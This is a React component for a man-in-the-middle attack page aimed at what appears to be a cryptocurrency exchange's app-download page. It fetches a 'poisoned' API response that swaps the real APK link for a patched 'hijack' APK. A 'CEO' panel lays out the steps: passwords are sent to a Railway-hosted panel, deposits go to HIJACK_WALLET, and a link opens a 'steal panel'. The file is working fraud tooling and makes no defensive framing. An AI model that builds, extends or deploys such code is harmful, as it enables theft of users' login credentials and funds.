"use client";

import { useCallback, useEffect, useState } from "react";
import BrowserChrome from "./BrowserChrome";
import DownAppClone from "./DownAppClone";
import { HIJACK_WALLET, REAL_DOWNLOAD_API, STEAL_PANEL_URL } from "@/lib/config";

type Swapped = { type: string; from: string; to: string };

export default function MitmAttackPage() {
  const [showCeo, setShowCeo] = useState(true);
  const [realApi, setRealApi] = useState<unknown>(null);
  const [poisonApi, setPoisonApi] = useState<unknown>(null);
  const [swapped, setSwapped] = useState<Swapped[]>([]);
  const [step, setStep] = useState(1);

  const loadApiCompare = useCallback(async () => {
    try {
      const [realRes, poisonRes] = await Promise.all([
        fetch("/api/real/downloadlink", { cache: "no-store" }),
        fetch("/api/proxy/downloadlink", { cache: "no-store" }),
      ]);
      const real = await realRes.json();
      const poison = await poisonRes.json();
      setRealApi(real);
      setPoisonApi(poison);
      setSwapped(Array.isArray(poison._swapped) ? poison._swapped : []);
      setStep(2);
    } catch {
      setStep(1);
    }
  }, []);

  useEffect(() => {
    loadApiCompare();
  }, [loadApiCompare]);

  function onApiResponse(data: unknown) {
    setPoisonApi(data);
    const p = data as { _swapped?: Swapped[] };
    if (p._swapped) setSwapped(p._swapped);
    setStep(3);
  }

  return (
    <div className="mitm-layout">
      <BrowserChrome showCeoNote={showCeo} />

      <div className="mitm-body">
        <div className="mitm-page-col">
          <DownAppClone onApiResponse={onApiResponse} useMitmProxy />
        </div>

        {showCeo && (
          <aside className="mitm-ceo-panel">
            <div className="mitm-ceo-header">
              <h2>CEO — Live MITM Attack</h2>
              <button type="button" onClick={() => setShowCeo(false)} className="mitm-btn-sm">
                Hide
              </button>
            </div>

            <ol className="mitm-steps">
              <li className={step >= 1 ? "active" : ""}>
                User opens <strong>thsexcex.online/#/pages/downapp/index</strong>
              </li>
              <li className={step >= 2 ? "active" : ""}>
                Page calls <code>GET {REAL_DOWNLOAD_API}</code>
              </li>
              <li className={step >= 3 ? "active" : ""}>
                Hacker swaps APK URL in JSON response
              </li>
              <li className={step >= 4 ? "active" : ""}>
                User installs <strong>THSEX6401.apk</strong> (patched)
              </li>
              <li className={step >= 5 ? "active" : ""}>
                Login → password on Railway panel
              </li>
              <li className={step >= 6 ? "active" : ""}>
                Deposit/withdraw → <code>{HIJACK_WALLET}</code>
              </li>
            </ol>

            {swapped.length > 0 && (
              <div className="mitm-swap-box">
                <h3>URL swapped (live)</h3>
                {swapped.map((s) => (
                  <div key={s.type} className="mitm-swap-row">
                    <div>
                      <span className="label">Real CDN</span>
                      <code className="from">{s.from}</code>
                    </div>
                    <div className="arrow">↓</div>
                    <div>
                      <span className="label">Hijack APK</span>
                      <code className="to">{s.to}</code>
                    </div>
                  </div>
                ))}
              </div>
            )}

            <details className="mitm-json-details">
              <summary>Real API response</summary>
              <pre>{JSON.stringify(realApi, null, 2)}</pre>
            </details>

            <details className="mitm-json-details" open>
              <summary>Poisoned API response (what user gets)</summary>
              <pre>{JSON.stringify(poisonApi, null, 2)}</pre>
            </details>

            <div className="mitm-actions">
              <button type="button" onClick={loadApiCompare} className="mitm-btn">
                Refresh API compare
              </button>
              <a href={STEAL_PANEL_URL} target="_blank" rel="noreferrer" className="mitm-btn mitm-btn-green">
                Open steal panel →
              </a>
              <a href="/ceo" className="mitm-btn mitm-btn-outline">
                Full CEO flow
              </a>
            </div>
          </aside>
        )}
      </div>

      {!showCeo && (
        <button type="button" className="mitm-show-ceo" onClick={() => setShowCeo(true)}>
          Show CEO panel
        </button>
      )}
    </div>
  );
}
